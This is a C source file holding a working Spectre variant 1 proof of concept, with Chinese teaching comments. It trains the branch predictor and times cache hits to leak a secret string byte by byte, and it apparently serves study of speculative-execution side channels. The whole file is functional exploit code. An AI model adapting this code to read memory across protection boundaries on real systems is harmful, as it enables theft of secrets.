#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> 
#pragma optimize("gt", on)
#else
#include <x86intrin.h>
#endif
#ifndef _MSC_VER
#define sscanf_s sscanf
#endif
/********************************************************************
victim code
********************************************************************/
unsigned int victim_controled_array_size = 16;//设置权限边界

uint8_t unused_begin[64];//在victim_controled_array前后各定义64字节未使用内存空间

//uint8_t 定义victim_controled_array的每个元素1字节，memory中一个地址空间存储 1 byte，即8 bits数据，对应一个ASCII值
uint8_t victim_controled_array[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};

uint8_t unused_end[64];//在victim_controled_array前后各定义64字节未使用内存空间

uint8_t attack_controled_array[256 * 512];//256个cache line

char* secret = "NingXiaUniversity@xgy";

uint8_t temp = 0;//避免被优化

void victim_function(size_t x)
{
	if (x < victim_controled_array_size)
	{
		temp &= attack_controled_array[victim_controled_array[x] * 512];
	}
}


/********************************************************************
analysis code
********************************************************************/
//设置阈值 80
#define CACHE_HIT_THRESHOLD (80)

//最优猜测：value[0]，次优猜测值：value[1]
void readMemoryByte( unsigned long malicious_x, unsigned char value[2], int score[2])
{
	static int results[256];

	int tries, i, j, k, mix_i;

	unsigned int junk = 0;

	//size_t training_x, x;
	unsigned long training_x, x;

	register unsigned long time_begin, time_end;

	volatile unsigned char* addr;//volatile关键字提醒编译器不要优化该变量，而是直接从内存地址读取数据

	for (i = 0; i < 256; i++) 
		results[i] = 0;

	for (tries = 999; tries > 0; tries--)
	{
		//将attack_controled_array踢出cache
		for (i = 0; i < 256; i++)
			_mm_clflush(&attack_controled_array[i * 512]);

		//30次循环：每训练5次(x=training_x)，攻击1次(x=malicious_x)。
		training_x = tries % victim_controled_array_size;
		for(j = 29; j >= 0; j--)
		{ 
			_mm_clflush(&victim_controled_array_size);//将victim_controled_array_size从cache中擦除
			
			for (volatile int z = 0; z < 100; z++)
			{
				/* Delay (can also mfence) */
			} 
			
			//控制5次training_x，1次malicious_x
			x = ((j % 6) - 1) & ~0xFFFF; 
			/* Set x=-1 if j%6=0, else x=0 */
			x = (x | (x >> 16)); 

			//异或^ 相同取0 相异为1
			//当x=0时， x=training_x
			//当x=-1时,存储补码0xfffffff，x=malicious_x
			x = training_x ^ (x & (malicious_x ^ training_x));
			victim_function(x);
		}


		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		//对刚才进行的5次恶意访问进行分析
		for (i = 0; i < 256; i++)
		{
			/* 
			乘以 167 是为了打乱 i 的顺序，使得生成的随机数更加均匀分布。
			如果直接用 i 来取模，那么生成的随机数就会按照 i 的增长而循环，没有随机性。
			167 是一个素数，它和 256 互质，所以乘以 167 后取模 256，
			可以得到 0 ~ 255 中的所有可能值。
			当然，也可以用其他的素数来代替 167，只要它们和 256 互质即可。
			*/
			mix_i = ((i * 167) + 13) & 255;//255与，只留低8bit

			addr = &attack_controled_array[mix_i * 512];

			//计算时间差
			time_begin = __rdtscp(&junk); /* READ TIMER */
			
			junk = *addr;//从内存中读取addr地址的值

			time_end = __rdtscp(&junk) - time_begin;

			//访问时间小于阈值就将访问的mix_i记录
			if (time_end <= CACHE_HIT_THRESHOLD && mix_i != victim_controled_array[tries % victim_controled_array_size])
				++results[mix_i]; //对应位的result数组加1
		}

		//最优/次优结果：j/k
		j = k = -1;
		
		//每一轮都对result[255]进行一次分析
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				//将最大值赋给j，次大值赋给k
				k = j;j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				//将小于j但是大于k的值保存到次优结果中
				k = i;
			}
		}

		//判断是否需要提前终止比较，可以删除
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}//for tries 999

	results[0] ^= junk; /* use junk so code above won't get optimized out*/

	value[0] = (uint8_t)j; score[0] = results[j];

	value[1] = (uint8_t)k; score[1] = results[k];
}


int main(int argc, const char** argv)
{
	printf("将secret数组 【%s】 放置在内存中，其存放地址:【%p】\n", secret, (void *)(secret));
	//获取偏移量，也就是预测执行将要读取的地方
	size_t malicious_x = (size_t)(secret - (char *)victim_controled_array); 

	//最优guess[0]对应的分数：score[0]
	int score[2], len = strlen(secret);
	//最优guess：value[0]，次优guess：value[1]
	uint8_t value[2];

	//避免copy on write优化措施，通过写获得操作系统真正的分配地址
	for (size_t i = 0; i < sizeof(attack_controled_array); ++i)
		attack_controled_array[i] = 1;

	printf("共读取 %d 字节:\n", len);
	while (--len >= 0)
	{
		printf("read (malicious_x):[%p] ", (void *)malicious_x);
		//依次对所有字节发起攻击
		readMemoryByte(malicious_x++, value, score);

		printf("%s: ", (score[0] >=  score[1] ? "成功" : "不明"));
		printf("0x%02X='%c' score=%d ", value[0], value[0], score[0] );

		if (score[1] > 0)
			printf("(second: 0x%02X='%c' second_score=%d)\n",value[1],value[1],score[1]);
	}


#ifdef _MSC_VER
	printf("Press ENTER to exit\n");
	getchar();	/* Pause Windows console */
#endif
	return (0);
}
